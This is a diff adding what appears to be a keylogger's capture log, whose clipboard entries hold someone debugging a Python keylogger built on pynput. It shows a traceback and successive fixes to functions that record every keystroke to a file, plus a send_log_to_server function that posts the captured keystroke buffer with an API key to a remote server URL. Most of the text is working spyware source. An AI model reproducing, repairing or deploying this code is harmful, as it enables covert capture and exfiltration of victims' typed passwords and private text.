@@ -1,0 +1,89 @@
+
+[CLIPBOARD] filename = date_folder / f"{now.strftime('%I:%M %p')}.txt"
+
+[up][up][enter]
+
+[CLIPBOARD] (venv) PS C:\PROJECTS\KEYLOGGER> python keylogger.py
+[✅ Keylogger started. Press Ctrl+C to stop]
+Unhandled exception in listener callback
+Traceback (most recent call last):
+  File "C:\PROJECTS\KEYLOGGER\venv\Lib\site-packages\pynput\_util\__init__.py", line 230, in inner
+    return f(self, *args, **kwargs)
+  File "C:\PROJECTS\KEYLOGGER\venv\Lib\site-packages\pynput\keyboard\_win32.py", line 329, in _process
+    self.on_press(key, injected)
+    ~~~~~~~~~~~~~^^^^^^^^^^^^^^^
+  File "C:\PROJECTS\KEYLOGGER\venv\Lib\site-packages\pynput\_util\__init__.py", line 146, in inner
+    if f(*args) is False:
+       ~^^^^^^^
+  File "C:\PROJECTS\KEYLOGGER\venv\Lib\site-packages\pynput\_util\__init__.py", line 291, in <lambda>
+    return lambda *a: f(*a[:actual])
+                      ~^^^^^^^^^^^^^
+  File "C:\PROJECTS\KEYLOGGER\keylogger.py", line 55, in on_press
+    write_log(key.char)
+    ~~~~~~~~~^^^^^^^^^^
+  File "C:\PROJECTS\KEYLOGGER\keylogger.py", line 23, in write_log
+    log_buffer += data
+TypeError: can only concatenate str (not "NoneType") to str
+
+[CLIPBOARD] def on_press(key):
+    try:
+        write_log(key.char)
+    except AttributeError:
+        special_keys = {
+            keyboard.Key.space: " ",
+            keyboard.Key.enter: "[enter]\n",
+            keyboard.Key.tab: "[tab]",
+            keyboard.Key.backspace: "[backspace]",
+            keyboard.Key.cmd: "[windows]",
+        }
+        if key in special_keys:
+            write_log(special_keys[key])
+        else:
+            write_log(f"[{key.name}]")
+
+[CLIPBOARD] def write_log(data):
+    global log_buffer
+    log_buffer += data
+    with open(log_file, "a", encoding="utf-8") as f:
+        f.write(data)
+
+def send_log_to_server():
+    try:
+        if log_buffer.strip():
+            print("[🚀 Sending log to server...]")
+            response = requests.post(
+                SERVER_URL,
+                json={"api_key": API_KEY, "log": log_buffer}
+            )
+            print("[✔️ LOG SENT]", response.status_code)
+    except Exception as e:
+        print("[❌ ERROR SENDING LOG]:", e)
+
+[CLIPBOARD] def on_press(key):
+    try:
+        if key.char is not None:
+            write_log(key.char)
+        else:
+            write_log(f"[{key.name}]")
+    except AttributeError:
+        # Handle special keys like enter, tab, etc.
+        special_keys = {
+            keyboard.Key.space: " ",
+            keyboard.Key.enter: "[enter]\n",
+            keyboard.Key.tab: "[tab]",
+            keyboard.Key.backspace: "[backspace]",
+            keyboard.Key.cmd: "[windows]",
+        }
+        if key in special_keys:
+            write_log(special_keys[key])
+        else:
+            write_log(f"[{key}]")
+
+
+[CLIPBOARD] def write_log(data):
+    global log_buffer
+    if data:
+        log_buffer += str(data)
+        with open(log_file, "a", encoding="utf-8") as f:
+            f.write(str(data))
+
